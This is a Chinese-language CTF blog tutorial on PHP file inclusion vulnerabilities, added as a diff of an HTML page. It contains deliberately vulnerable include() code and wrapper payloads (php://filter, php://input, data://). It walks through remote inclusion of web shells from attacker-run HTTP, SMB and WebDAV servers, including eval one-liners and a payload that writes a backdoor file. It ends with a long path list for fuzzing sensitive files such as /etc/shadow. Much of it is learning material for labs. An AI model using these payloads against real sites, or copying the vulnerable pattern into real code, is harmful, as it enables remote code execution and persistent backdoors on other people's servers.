@@ -1,0 +1,1807 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>php文件包含总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">php文件包含总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">2022-11-23</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul>
+<li>如果文件包含函数没有经过严格的过滤或者定义<br>并且参数可以被用户控制<br>这样就有可能包含非预期的文件。</li>
+<li>如果文件中存在恶意代码，无论文件是什么类型<br>恶意代码都会被解析。</li>
+<li>文件包含漏洞可能会造成服务器的网页被篡改，网站被挂马，服务器被远程控制，被安装后门等危害</li>
+</ul>
+<h1 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h1><p> PHP里面共有4个与文件包含相关的函数,分别是:</p>
+<pre><code>include  
+require
+include_once
+require_once
+</code></pre>
+<p>include和require函数的作用并没有太大的区别，这里就只放出include的说明</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155546122.png" alt="image-20221123155546122"></p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155609821.png" alt="image-20221123155609821"></p>
+<h1 id="支持的协议和封装协议"><a href="#支持的协议和封装协议" class="headerlink" title="支持的协议和封装协议"></a>支持的协议和封装协议</h1><p>我们可以看到文件包含函数可以使用封装协议</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155918249.png" alt="image-20221123155918249"></p>
+<p><strong>支持的协议和封装协议</strong></p>
+<pre><code class="php">•file:// — 访问本地文件系统
+•http:// — 访问 HTTP(s) 网址
+•ftp:// — 访问 FTP(s) URLs
+•php:// — 访问各个输入/输出流（I/O streams）
+•zlib:// — 压缩流
+•data:// — 数据（RFC 2397）
+•glob:// — 查找匹配的文件路径模式
+•phar:// — PHP 归档
+•ssh2:// — Secure Shell 2
+•rar:// — RAR
+•ogg:// — 音频流
+•expect:// — 处理交互式的流
+</code></pre>
+<p>这里重点讲下常用的伪协议:</p>
+<p>1.<code>file://</code><br> 这个协议可以展现本地文件系统,默认目录是当前的工作目录。</p>
+<pre><code>file:///path/to/file.ext 在文件包含中其实也就是等价 /path/to/file.ext
+例如：file:///etc/passwd、file://key.txt
+但是如果来个题目给你来个正则匹配 ../ 或 / 开头的时候就可以用这个方法来绕过了。
+</code></pre>
+<p>2.<code>php://</code><br> (1)<code>php://input</code>是个可以访问请求的原始数据的只读流<br> (2)<code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123160555145.png" alt="image-20221123160555145"></p>
+<p>各种过滤器</p>
+<pre><code class="php">(1)
+readfile(&quot;http://www.example.com&quot;);
+等价于
+readfile(&quot;php://filter/resource=http://www.example.com&quot;);  //这种写法等于没有设置过滤器
+(2)
+读取链
+file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;);
+写入链
+file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=[file]&quot;,&quot;base64&quot;);
+这个点在ctf有时候会很有用,可以绕过一些waf
+</code></pre>
+<p>(3)<code>php://input</code></p>
+<pre><code class="php">可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。
+有自身局限性:
+allow_url_fopen :off/on (默认配置on)            allow_url_include:on (默认配置off)
+</code></pre>
+<p>最后用一个表来总结:</p>
+<table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th>测试php版本</th>
+<th align="center">allow_url_fopen</th>
+<th align="center">allow_url_include</th>
+<th align="left">用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file://</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td align="left">?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td>
+</tr>
+<tr>
+<td align="center">php://filter</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td align="left">?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
+</tr>
+<tr>
+<td align="center">php://input</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">on</td>
+<td align="left">?file=php://input  [POST DATA] <?php phpinfo()?></td>
+</tr>
+<tr>
+<td align="center">zip://</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td align="left">?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td>
+</tr>
+<tr>
+<td align="center">compress.bzip2://</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td align="left">?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 [or]   ?file=compress.bzip2://./file.bz2</td>
+</tr>
+<tr>
+<td align="center">compress.zlib://</td>
+<td>&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td align="left">?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz   [or]        ?file= compress.zlib://./file.gz</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td>&gt;=5.2</td>
+<td align="center">on</td>
+<td align="center">on</td>
+<td align="left">?file=data://text/plain,<?php phpinfo()?>  [or]                       ?file=data:text/plain,<?php phpinfo()?>    [or]                              [or]                                                                                                        data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=                                                            [or]                                                                                             data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td>
+</tr>
+</tbody></table>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>假设当前页面存在一个任意文件包含漏洞(无后缀限制),代码如下:</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$file = $_GET[&#39;file&#39;];
+include($file);
+?&gt;
+</code></pre>
+<h2 id="利用各种伪协议读取文件"><a href="#利用各种伪协议读取文件" class="headerlink" title="利用各种伪协议读取文件"></a>利用各种伪协议读取文件</h2><p>1.<code>file</code></p>
+<pre><code class="php">http://127.0.0.1/index.php?file=file://E:/phpstudy_pro/WWW/flag.php
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171144477.png" alt="image-20221123171144477"></p>
+<p>2.<code>php://filter</code></p>
+<pre><code class="php">http://127.0.0.1/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171244526.png" alt="image-20221123171244526"></p>
+<p>过程: 读取文件内容-&gt;base64编码-&gt;php不解析-&gt;显示base64编码</p>
+<h2 id="GetShell思路"><a href="#GetShell思路" class="headerlink" title="GetShell思路"></a>GetShell思路</h2><h3 id="allow-url-include-开启的情况"><a href="#allow-url-include-开启的情况" class="headerlink" title="allow_url_include 开启的情况"></a>allow_url_include 开启的情况</h3><p><code>allow_url_include</code> 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。</p>
+<p><code>allow_url_fopen</code> 默认开启,所以我们可以通过利用远程url或者<code>php://</code>协议直接getshell</p>
+<p>只有当allow_url_fopen=On和allow_url_include=On时，include等其他包含函数才会将URL代表的文件包含执行</p>
+<p><strong>1.</strong></p>
+<pre><code class="php">http://127.0.0.1/index.php?file=http://remote.com/shell.txt
+</code></pre>
+<p>我们可以在vps上使用python快速开启一个http服务:</p>
+<pre><code>python2 -m SimpleHTTPServer port
+python3 -m http.server port
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123172420851.png" alt="image-20221123172420851"></p>
+<p>我在里面放了一个文件内容是</p>
+<pre><code class="php">&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>我们来包含一下:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173149452.png" alt="image-20221123173149452"></p>
+<p><strong>2.</strong></p>
+<pre><code class="php">http://127.0.0.1/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123174036937.png" alt="image-20221123174036937"></p>
+<p><strong>3.</strong></p>
+<pre><code class="php">http://127.0.0.1/index.php?file=php://input PostData:&lt;?php phpinfo();?&gt;
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173745729.png" alt="image-20221123173745729"></p>
+<h3 id="allow-url-include-关闭双off的情况-window环境下"><a href="#allow-url-include-关闭双off的情况-window环境下" class="headerlink" title="allow_url_include 关闭双off的情况(window环境下)"></a>allow_url_include 关闭双off的情况(window环境下)</h3><p>此时我们来包含下远程文件:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153732695.png" alt="image-20221124153732695"></p>
+<p>不过就算 <code>allow_url_include</code> and <code>allow_url_fopen</code>均为off 在<strong>window主机环境</strong>下仍然可以进行远程文件执行</p>
+<blockquote>
+<p>1：什么是UNC路径？UNC路径就是类似\softer这样的形式的网络路径。<br> 2：UNC为网络（主要指局域网）上资源的完整Windows 2000名称。 注意主要这个字,所以说也支持远程网络<br> 格式：\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。<br> 目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。<br> 2：unc共享就是指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A1%AC%E7%9B%98">网络硬盘</a>的共享</p>
+</blockquote>
+<p>因为 <code>allow_url_include</code> 为off的时候,php不会加载远程的http 或者 ftp的url,但是没有禁止SMB的URL加载。</p>
+<p>因为SMB share服务器需要用UNC路径去访问,而Linux没有UNC路径所以这种方法只能在window下利用</p>
+<h4 id="利用1-UNC-gt-SMB"><a href="#利用1-UNC-gt-SMB" class="headerlink" title="利用1: UNC-&gt;SMB"></a>利用1: UNC-&gt;SMB</h4><p><strong>攻击场景</strong></p>
+<p>当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Web  shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。  </p>
+<p><strong>利用过程:</strong></p>
+<p>在vps上安装samba服务</p>
+<p>依次执行以下命令:</p>
+<pre><code class="shell">apt-get remove -y samba* 卸载 smaba 相关的软件
+apt-get install samba  //安装SAMBA服务器或者yum install -y samba*
+mkdir /var/www/html/pub/    //创建SMB共享目录
+chmod 0555 /var/www/html/pub/
+chown -R nobody:nogroup /var/www/html/pub/   //配置新创建的SMB共享目录的权限
+echo &gt; /etc/samba/smb.conf     //删除SAMBA服务器配置文件的默认内容
+</code></pre>
+<p>将下面的内容放在<code>/etc/samba/smb.conf</code>文件中</p>
+<pre><code class="shell">[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = indishell-lab
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
+
+[ethan]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+</code></pre>
+<p>重新启动SAMBA服务器以应用配置文件<code>/etc/samba/smb.conf</code>中的新配置 </p>
+<pre><code class="shell">service smbd restart 
+</code></pre>
+<p>成功重新启动SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求凭据。(我曾尝试用centos7去搭建这个服务，但是一直无法尝试成功，可能性有多种，最终我选择了本地搭建这个服务来作为示范)</p>
+<pre><code>\\192.168.1.104\
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153244103.png" alt="image-20221124153244103"></p>
+<p>我们在这个里面放入一个文件，里面内容为:</p>
+<pre><code class="php">&lt;?php phpinfo();?&gt;  // &lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153615623.png" alt="image-20221124153615623"></p>
+<p>我们再来包含一下这个文件:</p>
+<pre><code class="php">http://127.0.0.1/index.php?file=\\192.168.1.104\ethan\hy.txt
+</code></pre>
+<p>我们惊讶的发现竟然又可以进行远程文件包含了</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153911758.png" alt="image-20221124153911758"></p>
+<p>这个方法确实十分巧妙!</p>
+<h4 id="利用2-UNC-gt-webdav"><a href="#利用2-UNC-gt-webdav" class="headerlink" title="利用2:UNC-&gt;webdav"></a>利用2:UNC-&gt;webdav</h4><blockquote>
+<p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。<br>它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，<br>使应用程序可对Web Server直接读写，<br>并支持写文件锁定(Locking)及解锁(Unlock)，<br>还可以支持文件的版本控制。</p>
+</blockquote>
+<p><strong>攻击场景</strong></p>
+<p>当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web  shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p>
+<p><strong>利用:</strong></p>
+<p>需要使用匿名读取访问权限配置WebDAV服务器。</p>
+<pre><code class="shell">sudo apt-get install -y apache2  //安装Apache Web服务器
+sudo a2enmod dav
+sudo a2enmod dav_fs  //在Apache配置中启用WebDAV模块
+sudo mkdir -p /var/www/html/webdav
+sudo touch /var/www/html/webdav/shell.php  //创建WebDAV共享目录webdav和 php web shell
+sudo chown -R www-data:www-data  /var/www/    //将文件夹所有者更改为您的Apache用户，www-data以便Apache具有对该文件夹的写访问权
+</code></pre>
+<p>编辑WebDAV配置文件</p>
+<pre><code class="shell">/etc/apache2/sites-available/000-default.conf
+</code></pre>
+<p>不需要启用身份验证:</p>
+<pre><code class="shell">DavLockDB /var/www/html/DavLock
+&lt;VirtualHost *:80&gt;
+    # The ServerName directive sets the request scheme, hostname and port that
+    # the server uses to identify itself. This is used when creating
+    # redirection URLs. In the context of virtual hosts, the ServerName
+    # specifies what hostname must appear in the request&#39;s Host: header to
+    # match this virtual host. For the default virtual host (this file) this
+    # value is not decisive as it is used as a last resort host regardless.
+    # However, you must set it for any further virtual host explicitly.
+    #ServerName www.example.com
+
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+
+    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+    # error, crit, alert, emerg.
+    # It is also possible to configure the loglevel for particular
+    # modules, e.g.
+    #LogLevel info ssl:warn
+
+    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log
+    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined
+
+    # For most configuration files from conf-available/, which are
+    # enabled or disabled at a global level, it is possible to
+    # include a line for only one particular virtual host. For example the
+    # following line enables the CGI configuration for this host only
+    # after it has been globally disabled with &quot;a2disconf&quot;.
+    #Include conf-available/serve-cgi-bin.conf
+    Alias /webdav /var/www/html/webdav 
+    &lt;Directory /var/www/html/webdav&gt; 
+        DAV On 
+    &lt;/Directory&gt;
+&lt;/VirtualHost&gt;
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</code></pre>
+<p>重新启动Apache服务器，以使更改生效:</p>
+<pre><code class="shell">sudo service apache2 restart
+</code></pre>
+<p>还可以使用docker搭建:</p>
+<pre><code class="shell">docker pull https://hub.docker.com/r/bytemark/webdav  //拉取webdav镜像
+docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav  //用docker启动一个webdav服务器
+</code></pre>
+<p>我们可以在shell.php中写入:</p>
+<pre><code class="php">&lt;?php echo eval(system(&quot;whoami&quot;));phpinfo();?&gt;
+&lt;?PHP fputs(fopen(&#39;poc.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[Qftm])?&gt;&#39;);?&gt;
+</code></pre>
+<p>为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义<code>shell.php</code>，通过服务器加载远程<code>shell.php</code>给我们自动生成一个<code>Webshell</code>。</p>
+<p>请求构造的payload</p>
+<pre><code>127.0.0.1/index.php?file=//193.43.142.8//webdav/shell.php
+</code></pre>
+<p>我这里一直没有复现成功，就用别的大佬的图吧:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014318694.png" alt="image-20221125014318694"></p>
+<p>从图中可以看到远程加载<code>shell.php</code>利用成功，可以根据状态码分析其加载过程：</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014333601.png" alt="image-20221125014333601"></p>
+<p>其中<code>code 207</code>是由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p>
+<h3 id="尝试包含日志文件、环境文件等可控文件"><a href="#尝试包含日志文件、环境文件等可控文件" class="headerlink" title="尝试包含日志文件、环境文件等可控文件"></a>尝试包含日志文件、环境文件等可控文件</h3><p>这种利用方式其实在实战中是比较鸡肋的,因为默认的权限是不允许访问的,但是可以去尝试下。</p>
+<p>不过如果主机是window系统,像phpstudy那种一键安装的都具有高权限,完全可以通过包含一些文件来getshell。</p>
+<h4 id="Linux-系统"><a href="#Linux-系统" class="headerlink" title="Linux 系统"></a>Linux 系统</h4><p>一般在Linux系统下通过<code>apt-get install apache2</code> 默认安装的apache 或者nginx都没有权限访问这些文件</p>
+<p>关于linux权限问题可以参考鸟哥文章</p>
+<pre><code class="shell">root@VM-221-25-ubuntu:/var/log# ls -ll /var/log/apache2/access.log
+-rw-r----- 1 root adm 0 May 18 06:25 /var/log/apache2/access.log
+
+root@VM-221-25-ubuntu:/var/log# ls -ll /var/log/nginx/access.log
+-rw-r----- 1 www-data adm 0 May 18 06:25 /var/log/nginx/access.log
+
+root@VM-221-25-ubuntu:/var/log# ls -ll /var/log/
+drwxr-xr-x 2 root   adm           4096 May 18 06:25 nginx
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125191115735.png" alt="image-20221125191115735"></p>
+<p>这里以<code>/var/log/apache2/access.log</code>为例子,文件拥有者为root，所属群组为adm,root用户可以<code>rw-</code>,同群组用户<code>r—</code>只可以读。</p>
+<p>而我们的php和apache2进程的user一般是<code>www-data</code></p>
+<pre><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+root@VM-221-25-ubuntu:/var/log# groups www-data #查看用户所属的组
+www-data : www-data
+</code></pre>
+<p>所以说没办法访问到这些文件达到RCE目的,但是有时候有些管理员会因为方便等问题导致权限配置错误。</p>
+<p>我们可以收集下常见路径，然后进行fuzz</p>
+<pre><code class="shell">Linux:
+
+/etc/passwd
+/etc/shadow
+/etc/fstab
+/etc/host.conf
+/etc/motd
+/etc/ld.so.conf
+/var/www/htdocs/index.php
+/var/www/conf/httpd.conf
+/var/www/htdocs/index.html
+/var/httpd/conf/php.ini
+/var/httpd/htdocs/index.php
+/var/httpd/conf/httpd.conf
+/var/httpd/htdocs/index.html
+/var/httpd/conf/php.ini
+/var/www/index.html
+/var/www/index.php
+/opt/www/conf/httpd.conf
+/opt/www/htdocs/index.php
+/opt/www/htdocs/index.html
+/usr/local/apache/htdocs/index.html
+/usr/local/apache/htdocs/index.php
+/usr/local/apache2/htdocs/index.html
+/usr/local/apache2/htdocs/index.php
+/usr/local/httpd2.2/htdocs/index.php
+/usr/local/httpd2.2/htdocs/index.html
+/tmp/apache/htdocs/index.html
+/tmp/apache/htdocs/index.php
+/etc/httpd/htdocs/index.php
+/etc/httpd/conf/httpd.conf
+/etc/httpd/htdocs/index.html
+/www/php/php.ini
+/www/php4/php.ini
+/www/php5/php.ini
+/www/conf/httpd.conf
+/www/htdocs/index.php
+/www/htdocs/index.html
+/usr/local/httpd/conf/httpd.conf
+/apache/apache/conf/httpd.conf
+/apache/apache2/conf/httpd.conf
+/etc/apache/apache.conf
+/etc/apache2/apache.conf
+/etc/apache/httpd.conf
+/etc/apache2/httpd.conf
+/etc/apache2/vhosts.d/00_default_vhost.conf
+/etc/apache2/sites-available/default
+/etc/phpmyadmin/config.inc.php
+/etc/mysql/my.cnf
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf.d/httpd.conf
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+/home/apache/conf/httpd.conf
+/home/apache2/conf/httpd.conf
+/var/log/apache/error_log
+/var/log/apache/error.log
+/var/log/apache/access_log
+/var/log/apache/access.log
+/var/log/apache2/error_log
+/var/log/apache2/error.log
+/var/log/apache2/access_log
+/var/log/apache2/access.log
+/var/www/logs/error_log
+/var/www/logs/error.log
+/var/www/logs/access_log
+/var/www/logs/access.log
+/usr/local/apache/logs/error_log
+/usr/local/apache/logs/error.log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/access.log
+/var/log/error_log
+/var/log/error.log
+/var/log/access_log
+/var/log/access.log
+/usr/local/apache/logs/access_logaccess_log.old
+/usr/local/apache/logs/error_logerror_log.old
+/etc/php.ini
+/bin/php.ini
+/etc/init.d/httpd
+/etc/init.d/mysql
+/etc/httpd/php.ini
+/usr/lib/php.ini
+/usr/lib/php/php.ini
+/usr/local/etc/php.ini
+/usr/local/lib/php.ini
+/usr/local/php/lib/php.ini
+/usr/local/php4/lib/php.ini
+/usr/local/php4/php.ini
+/usr/local/php4/lib/php.ini
+/usr/local/php5/lib/php.ini
+/usr/local/php5/etc/php.ini
+/usr/local/php5/php5.ini
+/usr/local/apache/conf/php.ini
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache2/conf/php.ini
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/apache2/php.ini
+/etc/php5/apache/php.ini
+/etc/php5/apache2/php.ini
+/etc/php/php.ini
+/etc/php/php4/php.ini
+/etc/php/apache/php.ini
+/etc/php/apache2/php.ini
+/web/conf/php.ini
+/usr/local/Zend/etc/php.ini
+/opt/xampp/etc/php.ini
+/var/local/www/conf/php.ini
+/var/local/www/conf/httpd.conf
+/etc/php/cgi/php.ini
+/etc/php4/cgi/php.ini
+/etc/php5/cgi/php.ini
+/php5/php.ini
+/php4/php.ini
+/php/php.ini
+/PHP/php.ini
+/apache/php/php.ini
+/xampp/apache/bin/php.ini
+/xampp/apache/conf/httpd.conf
+/NetServer/bin/stable/apache/php.ini
+/home2/bin/stable/apache/php.ini
+/home/bin/stable/apache/php.ini
+/var/log/mysql/mysql-bin.log
+/var/log/mysql.log
+/var/log/mysqlderror.log
+/var/log/mysql/mysql.log
+/var/log/mysql/mysql-slow.log
+/var/mysql.log
+/var/lib/mysql/my.cnf
+/usr/local/mysql/my.cnf
+/usr/local/mysql/bin/mysql
+/etc/mysql/my.cnf
+/etc/my.cnf
+/usr/local/cpanel/logs
+/usr/local/cpanel/logs/stats_log
+/usr/local/cpanel/logs/access_log
+/usr/local/cpanel/logs/error_log
+/usr/local/cpanel/logs/license_log
+/usr/local/cpanel/logs/login_log
+/usr/local/cpanel/logs/stats_log
+/usr/local/share/examples/php4/php.ini
+/usr/local/share/examples/php/php.ini
+
+windows:
+
+c:\windows\php.ini
+c:\boot.ini
+c:\1.txt
+c:\a.txt
+c:\CMailServer\config.ini
+c:\CMailServer\CMailServer.exe
+c:\CMailServer\WebMail\index.asp
+c:\program files\CMailServer\CMailServer.exe
+c:\program files\CMailServer\WebMail\index.asp
+C:\WinWebMail\SysInfo.ini
+C:\WinWebMail\Web\default.asp
+C:\WINDOWS\FreeHost32.dll
+C:\WINDOWS\7i24iislog4.exe
+C:\WINDOWS\7i24tool.exe
+c:\hzhost\databases\url.asp
+c:\hzhost\hzclient.exe
+C:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnk
+C:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnk
+C:\WINDOWS\web.config
+c:\web\index.html
+c:\www\index.html
+c:\WWWROOT\index.html
+c:\website\index.html
+c:\web\index.asp
+c:\www\index.asp
+c:\wwwsite\index.asp
+c:\WWWROOT\index.asp
+c:\web\index.php
+c:\www\index.php
+c:\WWWROOT\index.php
+c:\WWWsite\index.php
+c:\web\default.html
+c:\www\default.html
+c:\WWWROOT\default.html
+c:\website\default.html
+c:\web\default.asp
+c:\www\default.asp
+c:\wwwsite\default.asp
+c:\WWWROOT\default.asp
+c:\web\default.php
+c:\www\default.php
+c:\WWWROOT\default.php
+c:\WWWsite\default.php
+C:\Inetpub\wwwroot\pagerror.gif
+c:\windows\notepad.exe
+c:\winnt\notepad.exe
+C:\Program Files\Microsoft Office\OFFICE10\winword.exe
+C:\Program Files\Microsoft Office\OFFICE11\winword.exe
+C:\Program Files\Microsoft Office\OFFICE12\winword.exe
+C:\Program Files\Internet Explorer\IEXPLORE.EXE
+C:\Program Files\winrar\rar.exe
+C:\Program Files\360\360Safe\360safe.exe
+C:\Program Files\360Safe\360safe.exe
